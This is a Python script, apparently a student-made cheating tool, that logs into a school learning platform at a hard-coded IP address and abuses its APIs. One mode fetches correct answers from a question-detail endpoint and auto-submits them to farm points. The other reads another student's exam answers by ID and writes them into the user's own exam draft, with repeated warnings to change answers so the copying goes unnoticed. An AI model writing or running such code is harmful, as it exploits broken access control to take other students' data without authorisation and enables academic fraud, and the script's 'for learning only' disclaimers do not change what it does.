import json
import msvcrt
import requests

def getToken(username, pwd):
    url = "http://124.160.107.92:3334/api/login"
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "account": username,
        "password": pwd,
        "isRemember": True
    }
    resp = requests.post(url, headers=headers, json=data)
    return json.loads(resp.text)['data']['token']

def getName(tk,xh):
    url = "http://124.160.107.92:3334/api/info"
    headers = {
        "Content-Type": "application/json",
        "Authorization": tk
    }
    data = {
        "account": xh
    }
    resp = requests.post(url, headers=headers, json=data)
    return json.loads(resp.text)['data']['RealName']

def commit(qid, answer, token):
    url = "http://124.160.107.92:3334/api/study/questionEval"
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    data = {
        "id": qid,
        "answer": answer
    }
    resp = requests.post(url, headers=headers, json=data)
    if resp.text == '{"code":10000,"msg":"成功","data":{"result":true},"error":"","succeed":true}':
        print("题目id：" + str(qid) + "  答案：" + answer + "  答题成功！积分+1")

def getanswer(qid, token):
    url = "http://124.160.107.92:3334/api/study/questionDetail"
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    data = {
        "id": qid
    }
    resp = requests.post(url, headers=headers, json=data)
    detail_data = json.loads(resp.text)
    return detail_data["data"]["answer"]

def getexamanswer(token, stuid):
    url = "http://124.160.107.92:3334/api/contest/paper/getUserDetail"
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    data = {
        "id": stuid
    }
    resp = requests.post(url, headers=headers, json=data)
    data = json.loads(resp.text)['data']['content']
    res = str(data).replace(',"isAuto":true,"getScore":null', '').replace(',"trueAnswer":null,"isTrue":null', '')
    return res

def addtmp(token, ans, id, remainat):
    url = "http://124.160.107.92:3334/api/contest/paper/addTmp"
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    data = {
        "content": str(ans),
        "id": id,
        "remainingAt": remainat
    }
    resp = requests.post(url, headers=headers, data=bytes(json.dumps(data, ensure_ascii=False).encode('utf-8')))
    if resp.text == '{"code":10000,"msg":"成功","data":null,"error":"","succeed":true}':
        print("操作成功！")
        print("注意：为了避免雷同，请务必修改答案，再进行手动提交！")
        print("注意：为了避免雷同，请务必修改答案，再进行手动提交！")
        print("注意：为了避免雷同，请务必修改答案，再进行手动提交！")
        print("注意：为了避免雷同，请务必修改答案，再进行手动提交！")
        print("注意：为了避免雷同，请务必修改答案，再进行手动提交！")
    else:
        print("操作失败！" + resp.text)
        print("请保留窗口并联系作者！")

def quickpractice(tk):
    print("欢迎使用普通积分模式")
    num = input("请输入目标积分（大于10）：")
    for qid in range(125, 134):
        commit(qid, getanswer(qid, tk), tk)
    for qid in range(831, int(num) + 831):
        commit(qid, getanswer(qid, tk), tk)

def quickexam(tk):
    print("欢迎使用紧急考试模式")
    print("=======================================")
    print("注意：请先关闭考试页面，否则以下操作无效！")
    print("注意：请先关闭考试页面，否则以下操作无效！")
    print("注意：请先关闭考试页面，否则以下操作无效！")
    print("=======================================")
    stuid = input("请输入目标ID（必须联系作者获取！）：")
    examid = input("请输入考试ID（必须联系作者获取！）：")
    remainat = input("请输入神秘代码（必须联系作者获取！）：")
    print("=======================================")
    ans = getexamanswer(tk, int(stuid))
    addtmp(tk, ans, int(examid), int(remainat))


print("  ______          _              _____ _______ ______ ")
print(" |  ____|        | |            / ____|__   __|  ____|")
print(" | |__ _   _  ___| | __ ______ | |       | |  | |__   ")
print(" |  __| | | |/ __| |/ / ______ | |       | |  |  __|  ")
print(" | |  | |_| | (__|   <         | |____   | |  | |     ")
print(" |_|   \__,_|\___|_|\_\         \_____|  |_|  |_|     ")
print("               v1.0                  ")
print("       仅供学习，请勿转载 ——ByZR        ")
print("                                     ")
xh = input("请输入学号：")
print("默认密码为Hziee学号后六位_")
password = input("请输入密码：")
tk = getToken(xh, password)
if tk != '':
    print("=======================================")
    print(getName(tk, xh) + " 登录成功")
    print("=======================================")
    print("本脚本仅供个人学习，造成任何后果均与作者无关。")
    print("本脚本仅供个人学习，造成任何后果均与作者无关。")
    print("本脚本仅供个人学习，造成任何后果均与作者无关。")
    print("=======================================")
    print("1 普通积分模式")
    print("2 紧急考试模式")
    print("=======================================")
    mode = input("请选择模式：")
    print("=======================================")
    if mode == '1':
        quickpractice(tk)
    elif mode == '2':
        quickexam(tk)
print("=======================================")
print("按下任意键退出...")
msvcrt.getch()
